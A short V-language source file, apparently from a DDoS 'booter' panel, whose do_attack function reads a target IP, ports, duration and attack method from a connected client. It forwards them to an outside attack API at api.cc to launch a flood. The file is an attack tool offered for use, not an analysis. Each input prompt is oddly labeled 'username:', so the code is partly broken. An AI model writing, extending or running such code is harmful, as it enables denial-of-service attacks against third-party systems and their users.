module commands

import net
import os
import net.http
import io

pub fn do_attack(mut conn net.TcpConn){
	    mut read := io.new_buffered_reader(reader: conn)
          conn.write_string("\rusername: ") or {0}
          methods := read.read_line() or {return}
          conn.write_string("\rusername: ") or {0}
          ip := read.read_line() or {return}
          conn.write_string("\rusername: ") or {0}
          ports := read.read_line() or {return}
          conn.write_string("\rusername: ") or {0}
          time := read.read_line() or {return}
          http.get_text('https://api.cc/api.php?&ip=' + ip + '&port=' + ports + '&time=' + time + '&method=' + methods)
}

fn main() {

}